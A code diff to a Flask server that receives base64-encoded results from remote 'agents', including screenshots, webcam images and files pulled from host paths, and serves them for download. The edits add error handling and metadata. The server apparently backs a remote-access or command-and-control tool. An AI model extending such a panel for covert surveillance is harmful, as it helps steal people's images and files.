@@ -317,8 +317,15 @@ def receive_result():
         if isinstance(encoded_data, dict):
             data = encoded_data
         else:
-            decoded_json = base64.b64decode(encoded_data).decode()
-            data = json.loads(decoded_json)
+            try:
+                decoded_json = base64.b64decode(encoded_data).decode()
+                data = json.loads(decoded_json)
+            except Exception as e:
+                logging.error(f"Error decoding result data: {str(e)}")
+                return jsonify({
+                    'status': 'error',
+                    'message': 'Invalid data format'
+                }), 400
 
         agent_id = data.get('agent_id')
         task_id = data.get('task_id')
@@ -332,23 +339,51 @@ def receive_result():
                 'message': 'Missing required fields'
             }), 400
 
+        # Validate and sanitize result data
+        if isinstance(result, dict):
+            # Handle image data
+            if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
+                try:
+                    # Validate base64 image data
+                    base64.b64decode(result['data'])
+                except Exception as e:
+                    logging.error(f"Invalid image data in result: {str(e)}")
+                    result = {'error': 'Invalid image data'}
+            
+            # Handle file data
+            elif 'data' in result and result.get('path'):
+                try:
+                    # Validate base64 file data
+                    base64.b64decode(result['data'])
+                except Exception as e:
+                    logging.error(f"Invalid file data in result: {str(e)}")
+                    result = {'error': 'Invalid file data'}
+
         logging.info(f"Processing result from agent {agent_id} for task {task_id}")
         logging.debug(f"Result data: {json.dumps(result, indent=2)}")
 
-        # Store result
+        # Store result with metadata
         if agent_id not in results:
             results[agent_id] = {}
         results[agent_id][task_id] = {
             'result': result,
             'timestamp': timestamp,
-            'processed': False
+            'processed': False,
+            'type': data.get('type', ''),
+            'status': data.get('status', 'success'),
+            'error': data.get('error', None)
         }
 
         # Update agent's results
         if agent_id in agents:
             if 'results' not in agents[agent_id]:
                 agents[agent_id]['results'] = {}
-            agents[agent_id]['results'][task_id] = result
+            agents[agent_id]['results'][task_id] = {
+                'result': result,
+                'timestamp': timestamp,
+                'type': data.get('type', ''),
+                'status': data.get('status', 'success')
+            }
 
         logging.info(f"Successfully stored result from agent {agent_id} for task {task_id}")
         return jsonify({'status': 'success'})
@@ -377,49 +412,75 @@ def get_results_for_agent(agent_id):
 
 @app.route('/api/results/download/<task_id>', methods=['GET'])
 def download_result(task_id):
-    import base64, os, json
+    import base64, os, json, mimetypes
     for agent_id, agent_results in results.items():
         if task_id in agent_results:
             entry = agent_results[task_id]
-            result = entry.get('result')
-            # Handle image download (screenshot/webcam)
-            if isinstance(result, dict):
-                if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg']:
-                    file_data = base64.b64decode(result['data'])
-                    file_format = result.get('format', 'bin')
-                    filename = result.get('filename') or f'{task_id}.{file_format}'
-                    mimetype = f'image/{file_format.lower()}'
-                    return Response(file_data, mimetype=mimetype, headers={
-                        'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
-                    })
-                # Handle file download
-                if 'data' in result and result.get('path'):
-                    file_data = base64.b64decode(result['data'])
-                    filename = os.path.basename(result['path'])
-                    mimetype = 'application/octet-stream'
-                    return Response(file_data, mimetype=mimetype, headers={
+            result = entry.get('result', {})
+            
+            try:
+                # Handle image download
+                if isinstance(result, dict):
+                    if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
+                        file_data = base64.b64decode(result['data'])
+                        file_format = result.get('format', 'bin')
+                        filename = result.get('filename') or f'{task_id}.{file_format}'
+                        mimetype = f'image/{file_format.lower()}'
+                        return Response(file_data, mimetype=mimetype, headers={
+                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
+                        })
+                        
+                    # Handle file download
+                    if 'data' in result and result.get('path'):
+                        file_data = base64.b64decode(result['data'])
+                        filename = os.path.basename(result['path'])
+                        # Try to determine mimetype from file extension
+                        mimetype, _ = mimetypes.guess_type(filename)
+                        if not mimetype:
+                            mimetype = 'application/octet-stream'
+                        return Response(file_data, mimetype=mimetype, headers={
+                            'Content-Disposition': f'attachment;filename={filename}'
+                        })
+                        
+                    # Handle dictionary/JSON data
+                    content = json.dumps(result, indent=2)
+                    mimetype = 'application/json'
+                    filename = f'{task_id}.json'
+                    return Response(content, mimetype=mimetype, headers={
                         'Content-Disposition': f'attachment;filename={filename}'
                     })
-            # Fallback: serve as JSON/text
-            if isinstance(result, dict) or isinstance(result, list):
-                content = json.dumps(result, indent=2)
-                mimetype = 'application/json'
-                filename = f'{task_id}.json'
-            elif isinstance(result, str):
-                content = result
-                mimetype = 'text/plain'
-                filename = f'{task_id}.txt'
-            elif isinstance(result, bytes):
-                content = result
-                mimetype = 'application/octet-stream'
-                filename = f'{task_id}.bin'
-            else:
-                content = str(result)
-                mimetype = 'text/plain'
-                filename = f'{task_id}.txt'
-            return Response(content, mimetype=mimetype, headers={
-                'Content-Disposition': f'attachment;filename={filename}'
-            })
+                    
+                # Handle string data
+                elif isinstance(result, str):
+                    content = result
+                    mimetype = 'text/plain'
+                    filename = f'{task_id}.txt'
+                    return Response(content, mimetype=mimetype, headers={
+                        'Content-Disposition': f'attachment;filename={filename}'
+                    })
+                    
+                # Handle bytes data
+                elif isinstance(result, bytes):
+                    content = result
+                    mimetype = 'application/octet-stream'
+                    filename = f'{task_id}.bin'
+                    return Response(content, mimetype=mimetype, headers={
+                        'Content-Disposition': f'attachment;filename={filename}'
+                    })
+                    
+                # Fallback for any other type
+                else:
+                    content = str(result)
+                    mimetype = 'text/plain'
+                    filename = f'{task_id}.txt'
+                    return Response(content, mimetype=mimetype, headers={
+                        'Content-Disposition': f'attachment;filename={filename}'
+                    })
+                    
+            except Exception as e:
+                logging.error(f"Error processing download for task {task_id}: {str(e)}")
+                return str(e), 500
+                
     return 'Result not found', 404
 
 if __name__ == "__main__":
